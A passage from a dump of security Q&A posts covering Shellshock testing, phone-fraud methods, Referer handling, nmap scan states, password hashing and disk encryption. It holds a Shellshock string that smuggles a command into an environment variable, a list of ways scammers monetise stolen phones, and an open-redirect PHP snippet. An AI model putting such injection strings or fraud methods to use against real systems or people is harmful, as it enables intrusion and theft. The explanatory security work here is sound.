<li>Use it to send premium rate texts. The regulations on there are tighter, but if you can get a premium rate SMS number set up, you can charge up to £10 per text. A scammer would typically see between £5 and £7 of that, after the provider takes a cut. It's also possible to set up a recurring cost, where the provider sends you messages every day and charges you up to £2.50 for each one. By law the service provider must automatically cancel it if they send a text sayin STOP, but every extra message you send gains you money.</li>
<li>Set up an app in the app store, then buy it on peoples' phones. This can be very expensive for the victim, since apps can be priced very high - some up to £80. In-app purchases also work. This is precisely why you should be prompted for your password on <em>every</em> app purchase and in-app purchase, but not all phones do so!</li>
<li>Install a malicious app, such as the mobile Zeus trojan. This can then be used to steal banking credentials and email accounts. This seems to be gaining popularity on Android phones.</li>
</ul>
","25802"
"Is there a short command to test if my server is secure against the shellshock bash bug?","57506","","<p>I did <code>apt-get update; apt-get upgrade -y</code> on all systems I'm running. I'm not sure if my <code>/etc/apt/sources.list</code> is good enough on all of these systems. I would like to quickly check each system again, ideally with a one-line shell command.</p>

<p>Does such a one-line shell command exist and if so, what is it?</p>

<p><em>Note this question is mainly about CVE-2014-6271.</em></p>
","<h3>Is my bash vulnerable?</h3>

<p>This simple command is a sufficient test to see if your version of bash is vulnerable:</p>



<pre><code>x='() { :;}; echo VULNERABLE' bash -c :
</code></pre>



<p>It's not necessary to have extra text printed to signify that the command has actually run, because patched versions of bash will report a warning when a variable in its starting environment contains exploit code for the patched vulnerability.</p>

<p>On a vulnerable system:</p>

<pre><code>$ x='() { :;}; echo VULNERABLE' bash -c :
VULNERABLE
</code></pre>

<p>On a patched system:</p>

<pre><code>$ x='() { :;}; echo VULNERABLE' bash -c :
bash: warning: x: ignoring function definition attempt
bash: error importing function definition for `x'
</code></pre>

<p><em>For a detailed explanation of what this does and does not test for, and why, see ""Other Function Parsing Bugs"" below.</em></p>

<h3>Is my system vulnerable?</h3>

<p>If your bash isn't vulnerable then your system isn't vulnerable.</p>

<p>If your bash is vulnerable, then your system is vulnerable inasmuch as it uses bash along attack vectors such as CGI scripts, DHCP clients and restricted SSH accounts. Check whether <code>/bin/sh</code> is bash or some other shell. The vulnerability is in a bash-specific feature and other shells such as dash and ksh are not affected. You can test the default shell by running the same test as above with <code>sh</code> instead of <code>bash</code>:</p>

<pre><code>x='() { :;}; echo VULNERABLE' sh -c :
</code></pre>

<ul>
<li>If you see an error message, then your system has a patched bash and isn't vulnerable.</li>
<li>If you see <code>VULNERABLE</code>, then your system's default shell is bash and all attack vectors are a concern.</li>
<li>If you see no output, then your system's default shell is not bash, and only parts of your system that use bash are vulnerable. Check for:

<ul>
<li>Scripts executed by bash (starting with <code>#!/bin/bash</code>, not <code>#!/bin/sh</code>) from CGI or by a DHCP client.</li>
<li>Restricted SSH accounts whose shell is bash.</li>
</ul></li>
</ul>

<hr>

<h3>How This Test Works</h3>

<p>It runs the command <code>bash -c :</code> with the literal text <code>() { :;}; echo VULNERABLE</code> set as the value of the environment variable <code>x</code>.</p>

<ul>
<li><p><a href=""https://gnu.org/software/bash/manual/bash.html#Bourne-Shell-Builtins"" rel=""nofollow noreferrer"">The <code>:</code> builtin performs no action</a>; it's used here where a non-empty command is required.</p></li>
<li><p><code>bash -c :</code> creates an instance of bash that runs <code>:</code> and exits.</p>

<p>Even this is sufficient to allow the vulnerability to be triggered. Even though bash is being invoked to run only one command (and that command is a no-op), it still reads its environment and interprets each variable whose contents start with <code>() {</code> as a function (at least those whose names are valid function names) and runs it so the function will be defined.</p>

<p>The intent behind this behavior of bash is to run only a function definition, which makes a function available for use but doesn't actually run the code inside it.</p></li>
<li><p><code>() { :;}</code> is the definition for a function that performs no action when called. A space is required after <code>{</code> so that <code>{</code> is parsed as a separate token. A <code>;</code> or <a href=""https://en.wikipedia.org/wiki/Newline"" rel=""nofollow noreferrer"">newline</a> is required before <code>}</code> for it to be accepted as correct syntax.</p>

<p>See <a href=""https://gnu.org/software/bash/manual/bash.html#Shell-Functions"" rel=""nofollow noreferrer"">3.3 Shell Functions</a> in the <a href=""https://gnu.org/software/bash/manual/"" rel=""nofollow noreferrer"">Bash Reference Manual</a> for more information on the syntax for defining shell functions in bash. But note that the syntax used (and recognized) by bash as a valid exported shell function whose definition it should run is more restrictive:</p>

<ol>
<li>It must start with the exact string <code>() {</code>, with exactly one space between <code>)</code> and <code>{</code>.</li>
<li>And while shell functions occasionally have their compound statement enclosed in <code>( )</code> instead of <code>{ }</code>, they are still exported inside <code>{ }</code> syntax. Variables whose contents start with <code>() (</code> instead of <code>() {</code> will not test for or otherwise trigger the vulnerability.</li>
</ol></li>
<li><p>bash <em>should</em> stop executing code after the closing <code>}</code>. But (unless patched) it doesn't! <a href=""http://seclists.org/oss-sec/2014/q3/650"" rel=""nofollow noreferrer"">This is the wrong behavior that constitutes CVE-2014-6271 (""Shellshock"").</a></p>

<p><code>;</code> ends the statement that defines the function, allowing subsequent text to be read and run as a separate command. And the text after <code>;</code> doesn't have to be another function definition--it can be <em>anything at all.</em></p></li>
<li><p>In this test, the command after <code>;</code> is <code>echo VULNERABLE</code>. The leading space before <code>echo</code> does nothing and is present just for readability. The <code>echo</code> command writes text to <a href=""https://en.wikipedia.org/wiki/Standard_streams#Standard_output_.28stdout.29"" rel=""nofollow noreferrer"">standard output</a>. The full behavior of <code>echo</code> is actually somewhat complicated, but that's unimportant here: <code>echo VULNERABLE</code> is simple. It displays the text <code>VULNERABLE</code>.</p>

<p>Since <code>echo VULNERABLE</code> is only run if bash is unpatched and running code after function definitions in environment variables, this (and many other tests similar to it) is an effective test of whether or not the installed <code>bash</code> is vulnerable to CVE-2014-6271.</p></li>
</ul>

<hr>

<h3>Other Function Parsing Bugs (and why that test and those like it don't check for them)</h3>

<p><em>The patch that has been released as of this writing, and the commands described and explained above for checking vulnerability, apply to the very severe bug known as CVE-2014-6271. Neither this patch nor the commands described above for checking vulnerability apply to the related bug CVE-2014-7169 (nor should they be assumed to apply to any other bugs that may not yet have been discovered or disclosed).</em></p>

<p>The bug <a href=""http://seclists.org/oss-sec/2014/q3/650"" rel=""nofollow noreferrer"">CVE-2014-6271</a> arose from a combination of two problems:</p>

<ol>
<li>bash accepts function definitions in arbitrary environment variables, <em>and</em></li>
<li>while doing so, bash continues running any code that exists after the closing brace (<code>}</code>) of a function definition.</li>
</ol>

<p>As of this writing, the existing fix for CVE-2014-6271 that has been released (and rolled out by many downstream vendors)--that is, the fix you'd get by updating your system or by applying the existing patch manually--is a fix for <strong><em>2</em></strong>.</p>

<p>But in the presence of <em>other</em> mistakes in bash's code, <strong><em>1</em></strong> is potentially a source of many additional parsing bugs. And we <em>know</em> at least one other such bug exists--specifically, <a href=""https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-7169"" rel=""nofollow noreferrer"">CVE-2014-7169</a>.</p>

<p>The command presented in this answer tests for whether or not an installed bash is patched with the existing (i.e., first official) fix for CVE-2014-6271. It tests vulnerability to <a href=""https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271"" rel=""nofollow noreferrer"">that specific parsing bug</a>: ""GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables[...]""</p>

<p>That specific bug is extremely severe--and the available patch <em>does</em> fix it--while CVE-2014-7169 appears to be less severe but is definitely still cause for concern.</p>

<p>As <a href=""https://unix.stackexchange.com/users/22565/st%C3%A9phane-chazelas"">Stéphane Chazelas</a> (<a href=""http://seclists.org/oss-sec/2014/q3/649"" rel=""nofollow noreferrer"">discoverer of the Shellshock bug</a>) has <a href=""https://unix.stackexchange.com/a/157495/11938"">recently explained</a> in an answer to <a href=""https://unix.stackexchange.com/questions/157381/when-was-the-shellshock-cve-2014-6271-bug-introduced-and-what-is-the-patch-th"">When was the shellshock (CVE-2014-6271) bug introduced, and what is the patch that fully fixes it?</a> on <a href=""https://unix.stackexchange.com/"">Unix.SE</a>:</p>

<blockquote>
  <p>There is a patch that prevents <code>bash</code> from interpreting anything else
  than the function definition in there
  (<a href=""https://lists.gnu.org/archive/html/bug-bash/2014-09/msg00081.html"" rel=""nofollow noreferrer"">https://lists.gnu.org/archive/html/bug-bash/2014-09/msg00081.html</a>),
  and that's the one that has been applied in all the security updates
  from the various Linux distributions.</p>
  
  <p>However, bash still interprets the code in there and any bug in the
  interpreter could be exploited. One such bug <a href=""http://thread.gmane.org/gmane.comp.security.oss.general/13851"" rel=""nofollow noreferrer"">has already been
  found</a>
  (CVE-2014-7169) though its impact is a lot smaller. So there will be
  another patch coming soon.</p>
</blockquote>

<hr>

<h3><em>But if that's what the exploit looks like...</em></h3>

<p>Some people, here and elsewhere, have asked why <code>x='() { :;}; echo VULNERABLE' bash -c :</code> printing <code>VULNERABLE</code> (or similar) should be considered alarming. And I've recently seen the misconception circulating that <em>because you have to have interactive shell access already to type in that particular command and press enter</em>, Shellshock must somehow not be a serious vulnerability.</p>

<p>Although some of the sentiments I've heard expressed--that we should not rush to panic, that desktop users behind NAT routers shouldn't put their lives on hold to build bash from source code--are quite correct, confusing <strong>the vulnerability itself</strong> with <strong>the ability to test for it by running some specific command</strong> (such as the command presented here) is a serious mistake.</p>

<p>The command given in this post is an answer to the question, ""Is there a short command to test if my server is secure against the shellshock bash bug?"" It is <em>not</em> an answer to ""What does shellshock look like when it's used against me by a real attacker?"" and <strong>it is not an answer to the question, ""What does someone have to do to successfully exploit this bug?""</strong> (And it is <em>also</em> not an answer to, ""Is there a simple command to infer from all technical and social factors if I'm personally at high risk?"")</p>

<p>That command is a test, to see if bash will execute code written, in a particular way, in arbitrary environment variables. The Shellshock vulnerability is not <code>x='() { :;}; echo VULNERABLE' bash -c :</code>. Instead, that command (and others like it) is a <em>diagnostic</em> to help determine if one is affected by Shellshock.</p>

<ul>
<li><strong><em>Shellshock</em></strong> has wide ranging consequences, though it is true that the risk is almost certainly less for desktop users who are not running remotely accessible network servers. (How much less is something I don't think we know at this point.)</li>
<li>In contrast, <strong><em>the command</em></strong> <code>x='() { :;}; echo VULNERABLE' bash -c :</code> is entirely inconsequential except insofar as it is useful for testing for Shellshock (specifically, for CVE-2014-6271).</li>
</ul>

<p>For those who are interested, here are a few resources with information on why this bug is considered severe and why environment variables, particularly on network servers, may contain untrusted data capable of exploiting the bug and causing harm:</p>

<ul>
<li><a href=""http://seclists.org/oss-sec/2014/q3/650"" rel=""nofollow noreferrer"">Re: CVE-2014-6271: remote code execution through bash</a><br>
(Florian Weimer, Wed, 24 Sep 2014 17:03:19 +0200)</li>
<li><a href=""https://access.redhat.com/articles/1200223"" rel=""nofollow noreferrer"">Bash Code Injection Vulnerability via Specially Crafted Environment Variables (CVE-2014-6271, CVE-2014-7169)</a></li>
<li><a href=""https://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited"">What is a specific example of how the Shellshock Bash bug could be exploited?</a></li>
<li><a href=""https://security.stackexchange.com/questions/68139/attack-scenarios-of-the-new-bash-vulnerability"">Attack scenarios of the new Bash vulnerability</a></li>
<li><a href=""https://unix.stackexchange.com/questions/157384/cve-2014-6271-bash-vulnerability-example"">CVE-2014-6271 Bash Vulnerability example</a></li>
<li><a href=""https://unix.stackexchange.com/a/157428/11938"">kasperd's answer</a> to <a href=""https://unix.stackexchange.com/questions/157329/what-does-env-x-command-bash-do-and-why-is-it-insecure"">What does env x='() { :;}; command' bash do and why is it insecure?</a></li>
<li><a href=""https://unix.stackexchange.com/questions/157442/what-is-the-severity-of-the-new-bash-exploit-shellshock"">What is the severity of the new bash exploit (shellshock)?</a></li>
</ul>

<p>To further illustrate the conceptual distinction here, consider two hypotheticals:</p>

<ol>
<li><p>Imagine if instead of suggesting <code>x='() { :;}; echo VULNERABLE' bash -c :</code> as the test, I had suggested <code>bash --version</code> as the test. (That would actually not be particularly appropriate, because OS vendors frequently backport security patches to older versions of software. The version information a program gives you can, on some systems, make it look like the program would be vulnerable, when actually it has been patched.)</p>

<p>If testing by running <code>bash --version</code> were being suggested, no one would say, ""But attackers can't sit at my computer and type <code>bash --version</code>, so I must be fine!"" This is the distinction between a test and the problem being tested for.</p></li>
<li><p>Imagine if an advisory were issued suggesting that your car might have some safety problem, such as airbag failure or bursting into flames in a collision, and that factory demonstrations had been streamed. No one would say, ""But I would never accidentally drive or tow my car 900 miles to the factory and have it loaded with an expensive crash dummy and slammed into a concrete wall. So I must be fine!"" This is the distinction between a test and the problem being tested for.</p></li>
</ol>
","68177"
"What's the rationale behind Ctrl-Alt-Del for login","57420","","<p>Why is <kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>Del</kbd> required at login on certain Windows systems (I have not seen it elsewhere, but contradict me if I'm wrong) before the password can be typed in? From a usability point of view, it's a bad idea as it's adding an extra step in getting access.</p>

<p>Does it improve security in any way, and if so, how?</p>
","<p>This combination is called a <a href=""https://en.wikipedia.org/wiki/Secure_attention_key"">Secure attention key</a>. The Windows kernel is <em>""wired""</em> to notify <a href=""https://en.wikipedia.org/wiki/Winlogon"">Winlogon</a> and nobody else about this combination. In this way, when you press <kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>Del</kbd>, you can be sure<sup>†</sup> that you're typing your password in the real login form and not some other fake process trying to steal your password. For example, an application which looks exactly like the windows login.</p>

<p>In Linux, there's a <a href=""https://www.kernel.org/doc/Documentation/SAK.txt"">loosely-defined equivalent</a> which is <kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>Pause</kbd>. However, it doesn't exactly do the same thing. It kills everything except where you're trying to input your password. So far, there's no actual equivalent that would work when running <a href=""https://en.wikipedia.org/wiki/X_Window_System"">X</a>.</p>

<p><em><sup>†</sup> This implies a trust in the integrity of the system itself, it's still possible to patch the kernel and override this behaviour for other purposes (malicious or completely legitimate)</em> </p>
","34975"
"Is it dangerous to post my MAC address publicly?","57399","","<p>When posting questions, it is often quite useful to include debug output. However, it sometimes include the MAC address of my laptop, router, or both.</p>

<p>What are the possible dangers of releasing these mac addresses publicly?</p>
","<p>Disclosing the MAC address in itself shouldn't be a problem. MAC addresses <a href=""https://security.stackexchange.com/questions/23208/is-a-predictable-mac-address-a-risk"">are already quite predictable</a>, <a href=""https://superuser.com/questions/42757/how-to-sniff-for-wireless-mac-addresses-in-area-my-laptop-got-stolen"">easily sniffable</a>, and any form of authentication dependent on them is inherently weak and shouldn't be relied upon.</p>

<p>MAC addresses are almost always only used ""internally"" (between you and your immediate gateway). They really don't make it to the outside world and thus cannot be used to connect back to you, locate you, or otherwise cause you any direct harm.</p>

<p>The disclosure can be linked to your real identity since it <em>might</em> be possible to track you using data collected from WiFi networks, or it can be used to falsify a device's MAC address to gain access to some service (mostly some networks) on which your MAC address is white-listed.</p>

<p>Personally, I wouldn't really worry about it. However, when it's not inconvenient, I usually try to redact any irrelevant information when asking for help or sharing anything.</p>
","67896"
"Programming language for network security","57175","","<p>I am working as a tester now. I am planning to move to the domain of security such as a CEH or CISSP. But many say that to be a great hacker you need to know at least one programming language well. I already know a bit of Java. But I just wanted to know which language is closer to network security and related domains. So what kind of language should I be learning so that it would be helpful for me to move to the domain of security?</p>
","<p>There is no defined blueprint on what is the best language to learn. Therefor I would like to mention two good alternatives that I (and many otheres) think is a good languages to learn in computer security.</p>

<h2><a href=""http://www.lua.org/"" rel=""noreferrer"">LUA</a></h2>

<p>Explanation of Lua from <a href=""http://en.wikipedia.org/wiki/Lua_%28programming_language%29"" rel=""noreferrer"">wikipedia</a>: Lua is a lightweight multi-paradigm programming language designed as a scripting language with ""extensible semantics"" as a primary goal.</p>

<p>The reason I mention LUA is a good language to learn is that it is the scripting engine for MANY popular security tools. This is a very good reason alone to learn this language. Some of the langauges include: </p>

<ul>
<li>NMAP (Network mapping tool)</li>
<li>Snort (Open source IDS)</li>
<li>Wireshark (Packet sniffing tool)</li>
<li>Vim (Very popular unix text editor)</li>
<li>Cisco ASA (firewall, IPS, VPN)</li>
<li>Network services tools (Apache, lightHttpd, FreePop)</li>
</ul>

<p>On a side note: Even Blizzard major hit World of Warcraft has support for LUA scripting inside the game :) To whomever that may be relevant to. </p>

<h2><a href=""http://python.org/"" rel=""noreferrer"">Python</a></h2>

<p>I am a bit biased on Python after I've started reading the book ""<a href=""http://rads.stackoverflow.com/amzn/click/1593271921"" rel=""noreferrer"">Gray Hat Python: Python Programming for Hackers and Reverse Engineers</a>"". I agree with many of the points from this book why it is good to learn this langauge for a hacker (commonly known as security specialist :)). </p>

<p>Quoted from Amazon Python is good language to learn because: </p>

<blockquote>
  <p>it's easy to write quickly, and it has the low-level support and libraries that make hackers happy. </p>
</blockquote>

<p>It is also very comfortable to be able to interact on the fly with the interpreter in your Python shell.</p>

<p><strong>Edit:</strong>
Graphical view of HackerNews polls on favorite/ disliked programming languages:
<img src=""https://i.stack.imgur.com/pF5Kh.png"" alt=""python wins""></p>

<p><strong>Edit 2:</strong>
From <a href=""http://www.digininja.org/projects/breaking_in_part_1.php"" rel=""noreferrer"">Digininjas poll</a>:</p>

<pre><code>Language    Number  Percentage
Python  245 81%
Bash Scripting  241 79%
Ruby    127 42%
C   123 40%
Windows Powershell  111 37%
Batch Scripting 108 36%
PHP 107 35%
C++ 66  22%
Java    65  21%
Perl    57  19%
Other   57  19%
VB  29  10%
C#  26  9%
Lua 23  8%
</code></pre>
","11739"
"What is the relationship between ""SHA-2"" and ""SHA-256""","56977","","<p>I'm confused on the difference between SHA-2 and SHA-256 and often hear them used interchangeably (which seems really wrong).  I <em>think</em> SHA-2 a ""family"" of hash algorithms and SHA-256 a specific algorithm in that family.</p>

<p>Is that correct?  Can someone please clarify?  </p>
","<p>Just to cite wikipedia: <a href=""http://en.wikipedia.org/wiki/SHA-2"">http://en.wikipedia.org/wiki/SHA-2</a>:</p>

<blockquote>
  <p>The SHA-2 family consists of six hash functions with digests (hash values) that are 224, 256, 384 or 512 bits: SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224, SHA-512/256.</p>
</blockquote>

<p>So yes, SHA-2 is a range of hash functions and includes SHA-256.</p>
","87156"
"Playing with Referrer Header","56670","","<p>There are 2 sites:</p>

<pre><code>http://www.site1.com
http://www.site2.com
</code></pre>

<p><code>http://www.site1.com</code> contains link to <code>http://www.site2.com</code> as</p>

<pre><code>&lt;a href=""http://www.site2.com/""&gt;link&lt;a/&gt;
</code></pre>

<p>When user clicks on link from <code>http://www.site1.com</code> browser sends Referrer header to <code>http://www.site2.com</code>. Based on Referrer header <code>http://www.site2.com</code> makes some processes.</p>

<p>I wonder if I can fake/change (maybe with javascript, PHP, ...) Referrer header or not send it at all?</p>
","<p>There are <strong>two situations</strong> in which you would want to control the <code>Referer</code> header. By the way, <code>Referer</code> is a miss-spelling of the word ""referrer"". </p>

<p>If you want to control <strong>your personal browser</strong> not to pass the <code>Referer</code> to <code>site2.com</code>, you can do that with many browser extensions:</p>

<ul>
<li>For Firefox there is <a href=""https://addons.mozilla.org/en-us/firefox/addon/refcontrol/"">RefControl</a> (which I use and am happy with. I use the option ""Forge- send the root of the site"")</li>
<li>Chrome has <a href=""https://chrome.google.com/webstore/detail/referer-control/hnkcfpcejkafcihlgbojoidoihckciin?hl=en"">Referer Control</a></li>
</ul>

<p>The other situation is where you are a <strong>webmaster</strong> and you want the <strong>users of your site</strong> (site1.com) not to send the <code>Referer</code> to other sites linked on your site. You can do that in multiple ways:</p>

<ul>
<li>Use SSL/TLS (https) on your site and a security feature of the browser is not to pass the <code>Referer</code> when it uses SSL/TLS.</li>
<li>Use the HTML5 <code>rel=""noreferrer""</code> attribute. The downside to this is that it is not supported by many browsers, I know only Chrome supports it.</li>
<li>Use a Data URL ('data:') to hide the actual page the link is coming from: <code>&lt;a href='data:text/html;charset=utf-8, &lt;html&gt;&lt;meta http-equiv=""refresh"" content=""0;URL=&amp;#39;http://site2.com/&amp;#39;""&gt;&lt;/html&gt;'&gt;Link text&lt;/a&gt;</code>.</li>
<li>Hide the <code>Referer</code> by redirecting through an intermediate page. This type of redirection is often used to prevent potentially-malicious links from gaining information using the <code>Referer</code>, for example a session ID in the query string. Many large community websites use link redirection on external links to lessen the chance of an exploit that could be used to steal account information, as well as make it clear when a user is leaving a service, to lessen the chance of effective phishing. </li>
</ul>

<p>Here is a simplistic redirection example in PHP:</p>

<pre><code>&lt;?php
$url = htmlspecialchars($_GET['url']);
header( 'Refresh: 0; url=http://'.$url );
?&gt;
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Redirecting...&lt;/title&gt;
  &lt;meta http-equiv=""refresh"" content=""0;url=http://&lt;?php echo $url; ?&gt;""&gt;
 &lt;/head&gt;
 &lt;body&gt;
 Attempting to redirect to &lt;a href=""http://&lt;?php echo $url; ?&gt;""&gt;http://&lt;?php echo $url; ?&gt;&lt;/a&gt;.
 &lt;/body&gt;
&lt;/html&gt;
</code></pre>
","27916"
"nmap scan shows ports are filtered but nessus scan shows no result","56449","","<p>I'm performing an port scanning on a range of IPs on our remote site. I tried running nmap scan on that IP range and some of the IP result are shown as filtered</p>

<p>When I perform a nessus scan on the box, there is no result at all for some of the IPs.</p>

<p>As such is it safe to assume that there is no open ports on some of the remote server?</p>
","<p>Unless you've got nmap configured not to perform host discovery (<code>-PN</code> or <code>-PN --send-ip</code> on the LAN), if it is indicating that all ports are <em>filtered</em>, then the host is <em>up</em>, but the firewall on that host is dropping traffic to all the scanned ports.</p>

<p>Note that a default nmap scan does not probe all ports. It only scans 1000 TCP ports. If you want to check for <em>any</em> services, you'll want to check all 65535 TCP ports and all 65535 UDP ports.</p>

<p>Also, to be precise, but when the port scan says a port is <em>filtered</em>, that doesn't mean that there is no service running on that port. It's possible that the host's firewall has rules that are denying access to <em>the IP from which you're running the scan</em>, but there may be other IPs which are allowed to access that service.</p>

<p>If the port scan reports that a port is <em>closed</em>, that's more definitive that there's no service listening on that port.</p>

<p>I can't comment on the lack of results from nessus, it's been a while since I've used it.</p>

<p><strong>Example of closed vs. filtered vs. host-down</strong></p>

<p>E.g., on my network, this host is up, has no services running, and does not have a firewall, note that the ports are reported as <strong>closed</strong> (this means the host responded to probes on that port):</p>

<pre><code>% sudo nmap -T4 -n 192.168.1.24

Starting Nmap 5.00 ( http://nmap.org ) at 2011-11-30 11:20 EST
All 1000 scanned ports on 192.168.1.24 are closed
MAC Address: 00:0E:00:AB:CD:EF (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 7.70 seconds
</code></pre>

<p>This host is up, has no services running on ports 100-1000, and has a firewall. Note that the ports are reported as <strong>filtered</strong> (this means that the host dropped probes to those ports):</p>

<pre><code>% sudo nmap -T4 -n -p 100-1000 192.168.1.45

Starting Nmap 5.00 ( http://nmap.org ) at 2011-11-30 11:24 EST
All 901 scanned ports on 192.168.1.45 are filtered
MAC Address: 00:12:34:AA:BB:CC (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 20.03 seconds
</code></pre>

<p>Just for illustration, I punched a temporary hole in the firewall for that last host for port 443 and reran the scan. (There's nothing running on 443 there.) Notice how 998 ports are reported <em>filtered</em>, but port 443 is reported as <em>closed</em>; the firewall is allowing 443 through, and the OS responds with an RST.</p>

<pre><code>% sudo nmap -T4 -n 192.168.1.45

Starting Nmap 5.00 ( http://nmap.org ) at 2011-11-30 11:43 EST
Interesting ports on 192.168.1.45:
Not shown: 998 filtered ports
PORT    STATE  SERVICE
22/tcp  open   ssh
443/tcp closed https
MAC Address: 00:12:34:AA:BB:CC (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 5.67 seconds
</code></pre>

<p>There is no host at this address (<strong>host down</strong>):</p>

<pre><code>% sudo nmap -T4 -n 192.168.1.199

Starting Nmap 5.00 ( http://nmap.org ) at 2011-11-30 11:26 EST
Note: Host seems down. If it is really up, but blocking our ping probes, try -PN
Nmap done: 1 IP address (0 hosts up) scanned in 0.56 seconds
</code></pre>

<p>if I rescan with <code>-PN --send-ip</code> (the latter is needed because I'm scanning the LAN, and I don't want to use ARP probes), I see:</p>

<pre><code>% sudo nmap -T4 -n -PN --send-ip 192.168.1.199 

Starting Nmap 5.00 ( http://nmap.org ) at 2011-11-30 11:29 EST
All 1000 scanned ports on 192.168.1.199 are filtered

Nmap done: 1 IP address (1 host up) scanned in 101.44 seconds
</code></pre>
","9328"
"Is my developer's home-brew password security right or wrong, and why?","56431","","<p>A developer, let's call him 'Dave', <em>insists</em> on using home-brew scripts for password security. See Dave's proposal below.</p>

<p>His team spent months adopting an industry standard protocol using <a href=""http://bcrypt.sourceforge.net"">Bcrypt</a>.  The software and methods in that protocol are not new, and are based on tried and tested implementations that support millions of users. This protocol is a set of specifications detailing the current state of the art, software components used, and how they should be implemented. The implementation is based on a known-good implementation.</p>

<p>Dave argued against this protocol from day one. His reasoning was that algorithms like Bcrypt, because they are published, have greater visibility to hackers, and are more likely to be targeted for attack. He also argued that the protocol itself was too bulky and difficult to maintain, but I believe Dave's primary hangup was the fact that <a href=""http://bcrypt.sourceforge.net"">Bcrypt</a> is published.</p>

<p>What I'm hoping to accomplish by sharing his code here, is to generate consensus on: </p>

<ol>
<li>Why home-brew is not a good idea, and </li>
<li>What specifically is wrong with his script</li>
</ol>



<pre><code>/** Dave's Home-brew Hash */

// user data
$user = '';
$password = '';

// timestamp, random #
$time = date('mdYHis');
$rand = mt_rand().'\n';

// crypt
$crypt = crypt($user.$time.$rand);

// hash
function hash_it($string1, $string2) {
    $pass = md5($string1);
    $nt = substr($pass,0,8);
    $th = substr($pass,8,8);
    $ur = substr($pass,16,8);
    $ps = substr($pass,24,8);

    $hash = 'H'.sha1($string2.$ps.$ur.$nt.$th);
    return $hash
}

$hash = hash_it($password, $crypt);
</code></pre>
","<pre><code>/** Dave's Home-brew Hash^H^H^H^H^Hkinda stupid algorithm */

// user data
$user = '';
$password = '';

// timestamp, ""random"" #
$time = date('mdYHis'); // known to attackers - totally pointless
// ^ also, as jdm pointed out in the comments, this changes daily. looks broken!

// different hashes for different days? huh? or is this stored as a salt?
$rand = mt_rand().'\n'; // mt_rand is not secure as a random number generator
// ^ it's even less secure if you only ask for a single 31-bit number. and why the \n?

// crypt is good if configured/salted correctly
// ... except you've used crypt on the username? WTF.
$crypt = crypt($user.$time.$rand); 

// hash
function hash_it($string1, $string2) {
    $pass = md5($string1); // why are we MD5'ing the same pass when crypt is available?
    $nt = substr($pass,0,8); // &lt;--- BAD BAD BAD - why shuffle an MD5 hash?!?!?
    $th = substr($pass,8,8);
    $ur = substr($pass,16,8);
    $ps = substr($pass,24,8); // seriously. I have no idea. why?
    // ^ shuffling brings _zero_ extra security. it makes _zero_ sense to do this.
    // also, what's up with the variable names?

    // and now we SHA1 it with other junk too? wtf?
    $hash = 'H'.sha1($string2.$ps.$ur.$nt.$th); 
    return $hash
}

$hash = hash_it($password, $crypt); // ... please stop. it's hurting my head.

summon_cthulhu();
</code></pre>

<p>Dave, you are not a cryptographer. Stop it.</p>

<p>This home-brew method offers no real resistance against brute force attacks, and gives a false impression of ""complicated"" security. In reality you're doing little more than <code>sha1(md5(pass) + salt)</code> with a possibly-broken and overly complicated hash. You seem to be under the illusion that complicated code gives better security, but it doesn't. A strong cryptosystem is strong <em>regardless</em> of whether the algorithm is known to an attacker - this fact is known as <a href=""http://en.wikipedia.org/wiki/Kerckhoffs%27s_principle"" rel=""noreferrer"">Kerckhoff's principle</a>. I realise that it's fun to re-invent the wheel and do it all your own way, but you're writing code that's going into a business-critical application, which is going to have to protect customer credentials. You have a responsibility to do it correctly.</p>

<p>Stick to tried and tested key derivation algorithms like <a href=""http://en.wikipedia.org/wiki/PBKDF2"" rel=""noreferrer"">PBKDF2</a> or <a href=""http://en.wikipedia.org/wiki/Bcrypt"" rel=""noreferrer"">bcrypt</a>, which have undergone years of in-depth analysis and scrutiny from a wide range of professional and hobbyist cryptographers.</p>

<p>If you'd like a good schooling on proper password storage, check out these links:</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/17421/how-to-store-salt"">How to store salt?</a></li>
<li><a href=""https://security.stackexchange.com/questions/4781/do-any-security-experts-recommend-bcrypt-for-password-storage"">Do any security experts recommend bcrypt for password storage?</a></li>
<li><a href=""https://security.stackexchange.com/questions/211/how-to-securely-hash-passwords"">How to securely store passwords?</a></li>
</ul>
","25588"
"How secure is Ubuntu's default full-disk encryption?","56343","","<p>How secure is the encryption offered by ubuntu (using the disk utility)? What algorithm is used underneath it?</p>

<p>If someone could at least provide a link to some documentation or article regarding that I would be very grateful.</p>

<p>Reference:</p>

<p><img src=""https://i.stack.imgur.com/PrYuo.png"" alt=""enter image description here""></p>
","<p>In a word: <strong>sufficient</strong>.</p>

<p>This is block-level encryption, so it is filesystem-independent. </p>

<p>Ubuntu's transparent encryption is done through <code>dm-crypt</code> using <code>LUKS</code> as the key setup. The built-in default for <code>cryptsetup</code> versions before 1.6.0 is <code>aes-cbc-essiv:sha256</code> with 256-bit keys. The default for 1.6.0 and after (<a href=""https://code.google.com/p/cryptsetup/wiki/Cryptsetup160"">released 14-Jan-2013</a>) is <code>aes-xts-plain64:sha256</code> with 512-bit keys.</p>

<p><strong>For older versions of <code>cryptsetup</code>:</strong>  </p>

<ul>
<li><strong>AES</strong> you certainly know; it's about as good a cipher as you could want. </li>
<li><strong>CBC</strong> is the chaining mode; not horrible but certainly not what I would pick for new projects: it has several issues but it can be used securely. </li>
<li><strong>ESSIV</strong> (""Encrypted salt-sector initialization vector"") allows the system to create IVs based on a hash including the sector number and encryption key. This allows you to jump straight to to the sector you want without resorting to predictable IVs, and therefore protects you from watermarking attacks.</li>
<li><strong>SHA-256</strong> is the hashing algorithm used for key derivation. LUKS uses PBKDF2 to strengthen the key for (by default) a minimum of 1000 iterations or 1/8 second, whichever is more. On a fast computer, expect around 200,000 iterations. With respect to security, you couldn't ask for a better arrangement.</li>
</ul>

<p><strong>And with newer versions of <code>cryptsetup</code>:</strong>  </p>

<ul>
